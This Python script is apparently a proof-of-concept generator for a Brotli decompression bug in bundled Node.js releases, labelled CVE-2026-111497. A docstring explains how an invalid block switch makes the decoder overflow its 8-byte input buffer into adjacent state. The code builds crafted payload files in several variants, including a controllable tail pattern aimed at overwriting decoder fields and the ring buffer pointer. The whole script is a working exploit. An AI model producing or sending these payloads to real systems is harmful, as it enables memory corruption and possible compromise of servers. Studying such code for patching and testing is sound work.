#!/usr/bin/env python3
"""Node2Shell (CVE-2026-111497) trigger generator — hand-built Brotli bitstreams.

Derived by reading google/brotli v1.2.0 `c/dec/decode.c` + `state.h` (the exact
Brotli bundled into the vulnerable Node.js releases) and the v1.2.0 -> v1.2.1
patch. No third-party PoC payload is copied.

The bug in one paragraph
------------------------
`DecodeBlockTypeAndLength()` returns `BROTLI_BOOL`. `BROTLI_FALSE` means "this
method could not complete", and the two in-tree callers treat it as *not enough
input*: the `BROTLI_SAFE` macro maps it to `BROTLI_DECODER_NEEDS_MORE_INPUT`.
But the function also returns `BROTLI_FALSE` for a *permanent format error*:

    if (max_block_type <= 1) return BROTLI_FALSE;      /* v1.2.0 */

`max_block_type` is `num_block_types[tree_type]`, and a stream is perfectly free
to declare `NBLTYPESx == 1`. A block switch is nevertheless requested whenever
the corresponding `block_length[tree_type]` counter hits zero, and that counter
is only *reset* from the stream when `NBLTYPESx >= 2`:

    block_length[x] = BROTLI_BLOCK_SIZE_CAP (1 << 24)   /* state.c init */
    ... only re-read in BROTLI_STATE_HUFFMAN_CODE_3 when num_block_types[x] >= 2

So: give a tree `NBLTYPES == 1` while its `block_length` is zero and the decoder
asks to validate a switch it can never validate. In v1.2.0 it then reports
NEEDS_MORE_INPUT for input it cannot consume — forever. v1.2.1 returns
`BROTLI_DECODER_ERROR_FORMAT_BLOCK_SWITCH` instead (see the patch: the return
type becomes `BrotliDecoderErrorCode` and a new `BROTLI_SAFE_WITH_STATUS` macro
escalates a non-SUCCESS status out of the unsafe path).

Why that becomes memory corruption
----------------------------------
`BrotliDecoderDecompressStream()` handles NEEDS_MORE_INPUT by stashing unconsumed
input in a *8-byte* state field:

    /* Temporary storage for remaining input. Brotli stream format is designed in
       a way, that 64 bits are enough to make progress in decoding. */
    union { uint64_t u64; uint8_t u8[8]; } buffer;
    brotli_reg_t buffer_length;

Two loops feed it, and both assume the decoder eventually makes progress:

  * decode.c:2444-2455  appends ONE byte per retry (`buffer.u8[buffer_length++]`)
                        guarded only by `BROTLI_DCHECK(s->buffer_length < 8)`,
                        which is compiled out unless BROTLI_DEBUG is defined;
  * decode.c:2463-2468  copies the whole unconsumed tail in a `while` loop.

When the decoder cannot consume anything, `buffer_length` runs past 8 and the
input bytes land in the fields that follow the union: `buffer_length` itself,
then `pos`, `max_distance`, `ringbuffer_size`, `ringbuffer_mask`, `dist_rb[]`,
`meta_block_remaining_len` and finally the `uint8_t* ringbuffer` pointer.
That is the "corrupt adjacent decoder state memory" of CVE-2026-111497, and it
is why the impact is not merely a crash.

Payload plan (bit order is LSB-first; citations are decoder functions)
---------------------------------------------------------------------
stream header        DecodeWindowBits -> window_bits 16/17+n
meta-block A         makes block_length[0] == 0 while NBLTYPESL == 2 (so the
                     small length can legally come from the stream), then ends
                     the meta-block exactly on the last literal
meta-block B         declares NBLTYPESL == 1, so block_length[0] is NOT re-read
                     and is still 0; its first command asks for a literal
                     -> NextLiteralBlock -> DecodeLiteralBlockSwitch -> invalid
transaction          meta-block B ends in the last few bytes of the buffer, so
                     BrotliCheckInputAmount() fails, the decoder returns
                     NEEDS_MORE_INPUT, and the unconsumed tail is stashed in the
                     8-byte `buffer`. Any further input byte is appended blind.
"""

from __future__ import annotations

import argparse
import hashlib
import pathlib
import sys

ROOT = pathlib.Path(__file__).resolve().parent
OUT = ROOT / "payloads"

COMMANDS_OVERRIDE = [1 << 24]   # set by --commands, debug/scale control

ALPHABET_LITERAL = 256
ALPHABET_COMMAND = 704
BLOCK_SIZE_CAP = 1 << 24

# kCmdLut (c/dec/prefix_inc.h) entries used below:
#   8   -> insert_len_offset 1, insert extra 0 bits, copy_len_offset 2, copy extra 0, implicit distance
#   130 -> insert_len_offset 0, copy_len_offset 4, explicit distance
#   632 -> insert_len_offset 22594 + 24 extra bits, copy_len_offset 2
CMD_INSERT_ONE_COPY_TWO = 8
CMD_COPY_FOUR_EXPLICIT_DISTANCE = 130
CMD_INSERT_MAX = 632

# _kBrotliPrefixCodeRanges (c/common/constants.c): index -> (offset, extra bits)
BLOCK_LEN_RANGES = [
    (1, 2), (5, 2), (9, 2), (13, 2), (17, 3), (25, 3), (33, 3), (41, 3),
    (49, 4), (65, 4), (81, 4), (97, 4), (113, 5), (145, 5), (177, 5), (209, 5),
    (241, 6), (305, 6), (369, 7), (497, 8), (753, 9), (1265, 10), (2289, 11),
    (4337, 12), (8433, 13), (16625, 24),
]


class Bits:
    """LSB-first bit writer: Brotli packs the first field into the low bits."""

    def __init__(self) -> None:
        self.data = bytearray()
        self.value = 0
        self.used = 0

    def put(self, value: int, count: int) -> None:
        for i in range(count):
            bit = (value >> i) & 1
            self.value |= bit << self.used
            self.used += 1
            if self.used == 8:
                self.data.append(self.value & 0xFF)
                self.value = 0
                self.used = 0

    def align(self) -> None:
        if self.used:
            self.put(0, 8 - self.used)

    def raw(self, blob: bytes) -> None:
        assert self.used == 0, "raw() needs a byte-aligned writer"
        self.data += blob

    def finish(self) -> bytes:
        self.align()
        return bytes(self.data)


def varlen_u8(bits: Bits, value: int) -> None:
    """DecodeVarLenUint8. The decoder adds 1 to the value."""
    if value == 0:
        bits.put(0, 1)
        return
    bits.put(1, 1)
    if value == 1:
        bits.put(0, 3)
        return
    width = value.bit_length() - 1
    bits.put(width, 3)
    bits.put(value - (1 << width), width)


def bit_len(x: int) -> int:
    """Log2Floor() as spelled in decode.c (counts shifts, i.e. bit length)."""
    return x.bit_length()


def simple_tree(bits: Bits, alphabet_size: int, symbol: int) -> None:
    """One-symbol simple Huffman code (ReadHuffmanCode, type bits == 1)."""
    bits.put(1, 2)
    bits.put(0, 2)                                   # num_symbols - 1
    bits.put(symbol, bit_len(alphabet_size - 1))


def distance_alphabet(postfix: int, ndirect: int) -> int:
    return 16 + ndirect + (24 << (postfix + 1))


def write_stream_header(bits: Bits, window_bits_nibble: int) -> None:
    if window_bits_nibble == 0:
        bits.put(0, 1)                               # -> window_bits = 16
    else:
        bits.put(1, 1)
        bits.put(window_bits_nibble, 3)               # -> window_bits = 17 + n


def write_metablock_length(bits: Bits, out_len: int, islast: int = 0) -> None:
    """DecodeMetaBlockLength. Encodes out_len - 1; avoids the exuberant-nibble rule."""
    value = out_len - 1
    if value <= 0xFFFF:
        nibbles = 4
        bits.put(islast, 1)
        bits.put(0, 2)                               # MNIBBLES = 0 -> 4 nibbles
    else:
        nibbles = 6
        bits.put(islast, 1)
        bits.put(2, 2)                               # MNIBBLES = 2 -> 6 nibbles
    for i in range(nibbles):
        bits.put((value >> (i * 4)) & 0xF, 4)
    if not islast:
        bits.put(0, 1)                               # ISUNCOMPRESSED = 0


def write_compressed_metablock(
    bits: Bits,
    *,
    out_len: int,
    nbltypes: tuple[int, int, int],
    postfix: int = 0,
    ndirect: int = 0,
    literal_symbol: int = 0x41,
    command_symbol: int = CMD_INSERT_ONE_COPY_TWO,
    distance_symbol: int = 0,
    block_len_symbol: int = 0,
    block_len_extra: int = 0,
    tree_alphabet_literal: int = ALPHABET_LITERAL,
    tree_alphabet_command: int = ALPHABET_COMMAND,
    body: bytes = b"",
) -> None:
    """One compressed meta-block: header, block types, context maps, trees, body.

    A tree with a single block type gets no block-type tree and, crucially, no
    block-length read -- that is the state the bug depends on.
    """
    write_metablock_length(bits, out_len)

    for idx, count in enumerate(nbltypes):
        varlen_u8(bits, count - 1)
        if count < 2:
            continue
        bits.put(1, 2)                               # block-type tree: 1 symbol
        bits.put(0, 2)
        bits.put(0, bit_len(count + 1))              # always block type 0
        bits.put(1, 2)                               # block-length tree: 1 symbol
        bits.put(0, 2)
        bits.put(block_len_symbol, bit_len(25))      # 26-entry prefix alphabet
        _, extra_bits = BLOCK_LEN_RANGES[block_len_symbol]
        bits.put(block_len_extra, extra_bits)

    bits.put(((ndirect >> postfix) << 2) | postfix, 6)   # distance postfix / direct codes
    for _ in range(nbltypes[0]):
        bits.put(0, 2)                               # context modes

    varlen_u8(bits, 0)                               # literal num_htrees = 1
    varlen_u8(bits, 0)                               # distance num_htrees = 1

    simple_tree(bits, tree_alphabet_literal, literal_symbol)
    for _ in range(nbltypes[1]):
        simple_tree(bits, tree_alphabet_command, command_symbol)
    simple_tree(bits, distance_alphabet(postfix, ndirect), distance_symbol)

    if body:
        bits.align()
        bits.raw(body)


def build(*, window_bits_nibble: int = 0, tail: bytes = b"", variant: str = "lab-trigger") -> bytes:
    bits = Bits()
    write_stream_header(bits, window_bits_nibble)

    if variant in ("lab-trigger", "lab-trigger-over"):
        # Meta-block A: exactly one output unit. It exists only to leave
        # s->pos == 1, because in meta-block B the literal count and the ring
        # buffer position advance in lockstep -- with pos == 0 the ring buffer
        # would wrap exactly when block_length[0] reaches 0, and the wrap path
        # (decode.c:2054) returns before the drained check at decode.c:2046 can
        # run. A one-byte phase offset puts the check first.
        write_compressed_metablock(
            bits,
            out_len=1,
            nbltypes=(2, 1, 1),                      # lets the stream set block_length[0] = 1
            block_len_symbol=0,                      # offset 1 + 0 extra == 1
            block_len_extra=0,
            command_symbol=CMD_INSERT_ONE_COPY_TWO,  # insert 1, copy 2 (copy is never reached)
        )
        # Meta-block B: MLEN == BROTLI_BLOCK_SIZE_CAP and NBLTYPESL == 1, so
        # MetablockBegin leaves block_length[0] == CAP (a stream-declared
        # NBLTYPESL of 1 does not reset it). One command inserts exactly CAP
        # literals, which drains block_length[0] to 0 with mlr == CAP - CAP == 0.
        write_compressed_metablock(
            bits, out_len=BLOCK_SIZE_CAP, nbltypes=(1, 1, 1),
            command_symbol=CMD_INSERT_MAX,           # insert_code 23: 22594 + 24 extra bits
        )
        # `over` variant: insert CAP + 1 so `i` outlives block_length[0] after the
        # ring buffer wrap and the do-while reaches the drained check. Costs
        # mlr == -1, which only matters if the decoder returns to the caller.
        insert = BLOCK_SIZE_CAP + (1 if variant == "lab-trigger-over" else 0)
        bits.put(insert - 22594, 24)
        bits.align()
        bits.raw(tail)
        return bits.finish()

    if variant in ("cmd-drain", "dist-drain"):
        # Zero-cost command flood: drain a block-length counter from CAP without
        # spending MLEN.
        #
        # Lever: a copy whose distance exceeds max_distance takes the static
        # dictionary path, and BrotliTransformDictionaryWord() returns the number
        # of bytes it actually wrote -- NOT the (possibly negative) transformed
        # length. Pick a transform with an empty prefix/suffix whose omit/skip
        # fully consumes the word and it returns 0:
        #     pos += 0; s->meta_block_remaining_len -= 0;
        # So each command costs ZERO output and ZERO meta_block_remaining_len,
        # while still decrementing block_length[1] (ReadCommandInternal) and
        # block_length[2] (ReadDistanceInternal). That is how the drain survives
        # WriteRingBuffer's `meta_block_remaining_len < 0` guard.
        #
        # transform_idx = (distance_code - max_distance - 1) >> size_bits[copy_len]
        # with pos pinned at 0 (no literals, no output) -> max_distance == 0, so a
        # constant distance keeps a constant transform.
        #
        # postfix=3 doubles-and-then-some the distance span per extra bit, which
        # is what gets the cost down to 11 bits per command (the same 11-bit
        # command stride visible in other public payloads for this CVE).
        POSTFIX = 3
        NDIRECT = 0
        shift = 10                       # size_bits_by_length[copy_len = 4]
        transform = 34                   # OMIT_FIRST_4, empty prefix AND suffix
        word_idx = 1
        address = (transform << shift) + word_idx
        target = address + 1             # distance_code (max_distance == 0)
        # Replicate CalculateDistanceLut (decode.c:1804).
        code = bits_value = None
        i, b, half = 16, 1, 0
        while i < distance_alphabet(POSTFIX, NDIRECT):
            base = NDIRECT + ((((2 + half) << b) - 4) << POSTFIX) + 1
            for j in range(1 << POSTFIX):
                off = base + j
                if off <= target <= off + ((1 << b) - 1) * (1 << POSTFIX):
                    step = 1 << POSTFIX
                    if (target - off) % step == 0:
                        code, bits_value, code_bits = i, (target - off) >> POSTFIX, b
                i += 1
            b += half
            half ^= 1
        assert code is not None, "no distance code reaches the target transform"
        print("# distance code %d, %d extra bits, value %d -> distance %d, transform %d"
              % (code, code_bits, bits_value, target, transform), file=sys.stderr)

        write_compressed_metablock(
            bits,
            out_len=1,                       # no output is ever produced, so mlr stays 1
            nbltypes=(1, 1, 1),              # block_length[1] and [2] both start at CAP
            postfix=POSTFIX,
            ndirect=NDIRECT,
            command_symbol=CMD_COPY_FOUR_EXPLICIT_DISTANCE,   # insert 0, copy 4, dist from stream
            distance_symbol=code,
        )
        # CAP commands, `code_bits` each. 8 commands == 88 bits == 11 whole bytes,
        # so the body is one 11-byte pattern repeated 2^21 times; build it with
        # integer doubling instead of 16.7M individual bit writes.
        if COMMANDS_OVERRIDE[0] % 8: raise SystemExit("--commands must be a multiple of 8")
        grp = Bits()
        for _ in range(8):
            grp.put(bits_value, code_bits)
        assert grp.used == 0, "8 commands must land on a byte boundary"
        pattern = int.from_bytes(grp.finish(), "little")
        pattern_bits = 8 * code_bits
        reps = min(BLOCK_SIZE_CAP, COMMANDS_OVERRIDE[0]) // 8
        body = pattern
        for _ in range(reps.bit_length() - 1):          # 2^21 doublings
            body |= body << (pattern_bits * (1 << _))
        body_bits = pattern_bits * reps

        head_bits = len(bits.data) * 8 + bits.used        # header length in bits
        head = int.from_bytes(bytes(bits.data) + bytes([bits.value & 0xFF]), "little")
        total = head | (body << head_bits)
        if tail:
            total |= int.from_bytes(tail, "little") << (head_bits + body_bits)
        nbytes = (head_bits + body_bits + len(tail) * 8 + 7) // 8
        return total.to_bytes(nbytes, "little")

    if variant == "abenoshift":
        # Control: identical shape but NBLTYPESL == 2 in meta-block B as well, so
        # block_length[0] is re-read (large) and no invalid switch is requested.
        write_compressed_metablock(
            bits, out_len=1, nbltypes=(2, 1, 1), block_len_symbol=0, block_len_extra=0,
            command_symbol=CMD_INSERT_ONE_COPY_TWO,
        )
        write_compressed_metablock(
            bits, out_len=4, nbltypes=(2, 1, 1), block_len_symbol=25,
            block_len_extra=0xFFFFFF, command_symbol=CMD_INSERT_ONE_COPY_TWO,
        )
        bits.align()
        bits.raw(tail)
        return bits.finish()

    if variant in ("lit-flood", "lit-flood-over"):
        # Single meta-block. window_bits 24 -> the ring buffer is sized to
        # 1 << 24 == BROTLI_BLOCK_SIZE_CAP.
        #
        # block_length[0] == CAP (MetablockBegin; a stream-declared NBLTYPESL of 1
        # never lowers it) and the command's insert length is the lever:
        #   * insert == CAP  -> `i` and block_length[0] stay in lockstep, so the
        #     drain completes exactly at the ring buffer wrap and the check at
        #     decode.c:2046 is never reached. mlr == 0. Measured: clean
        #     NEEDS_MORE_INPUT on BOTH versions (no trigger).
        #   * insert  > CAP  -> `i` outlives block_length[0], so the do-while runs
        #     one more lap with block_length[0] == 0 and reaches
        #     `goto NextLiteralBlock` -> DecodeLiteralBlockSwitch ->
        #     DecodeBlockTypeAndLength sees max_block_type == 1 -> the invalid
        #     switch. The cost is mlr < 0, which WriteRingBuffer rejects as
        #     _ERROR_FORMAT_BLOCK_LENGTH_1 the moment the decoder returns.
        cap = BLOCK_SIZE_CAP
        cmd = CMD_INSERT_MAX                      # insert_code 23: 22594 + 24 extra bits
        if variant == "lit-flood-over":
            insert_extra = 0xFFFFFF               # insert = 22594 + 2^24-1 > CAP
        else:
            insert_extra = cap - 22594            # insert = CAP exactly
            assert 0 <= insert_extra <= 0xFFFFFF
        write_compressed_metablock(
            bits, out_len=cap, nbltypes=(1, 1, 1), command_symbol=cmd,
        )
        bits.put(insert_extra, 24)
        bits.align()
        bits.raw(tail)
        return bits.finish()

    if variant == "dist-switch":
        # Drains block_length[2] with copies: the distance block switch is the
        # one place a failed switch falls through to the copy instead of returning.
        write_compressed_metablock(
            bits, out_len=0xFFFFFF + 1, nbltypes=(1, 2, 1), block_len_symbol=25,
            block_len_extra=0xFFFFFF, command_symbol=CMD_COPY_FOUR_EXPLICIT_DISTANCE,
        )
        bits.align()
        bits.raw(tail)
        return bits.finish()

    if variant == "plain-valid":
        # Smallest ordinary stream: a single literal, nothing suspicious.
        write_compressed_metablock(bits, out_len=1, nbltypes=(1, 1, 1))
        bits.align()
        return bits.finish()

    raise SystemExit(f"unknown variant {variant!r}")


VARIANTS = ("cmd-drain", "dist-drain", "lab-trigger", "lab-trigger-over", "abenoshift",
            "lit-flood", "lit-flood-over",
            "dist-switch", "plain-valid")


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--variant", default="lab-trigger", choices=VARIANTS)
    ap.add_argument("--tail", type=int, default=0,
                    help="trailing padding bytes to append after the payload body")
    ap.add_argument("--tail-byte", default="00",
                    help="hex value for the trailing padding bytes")
    ap.add_argument("--window-nibble", type=int, default=None,
                    help="WBITS nibble: 0 -> 16 KiB window, 7 -> 24 (16 MiB ring buffer)")
    ap.add_argument("--tail-pattern", default=None,
                    help="exact tail bytes as hex; index 8 overwrites buffer_length's low "
                         "byte, and the next write lands at index (that byte + 1)")
    ap.add_argument("--commands", type=int, default=1 << 24,
                    help="command count for the drain variants (multiple of 8)")
    ap.add_argument("--out", default=None)
    args = ap.parse_args()

    COMMANDS_OVERRIDE[0] = args.commands
    if args.tail_pattern:
        tail = bytes.fromhex(args.tail_pattern)
    else:
        tail = bytes([int(args.tail_byte, 16)]) * args.tail
    nibble = args.window_nibble
    if nibble is None:
        # The literal flood needs a ring buffer that can hold the whole meta-block
        # (1 << 24) in one pass, so it needs the 24-bit window.
        nibble = 7 if args.variant in ("lit-flood", "lit-flood-over", "lab-trigger", "lab-trigger-over") else 0
    blob = build(variant=args.variant, tail=tail, window_bits_nibble=nibble)
    out = pathlib.Path(args.out or (OUT / f"{args.variant}.br"))
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_bytes(blob)
    print(f"variant  = {args.variant}")
    print(f"file     = {out}")
    print(f"size     = {len(blob)} bytes")
    print(f"sha256   = {hashlib.sha256(blob).hexdigest()}")
    print(f"hex      = {blob[:48].hex()}" + ("..." if len(blob) > 48 else ""))
    return 0


if __name__ == "__main__":
    sys.exit(main())
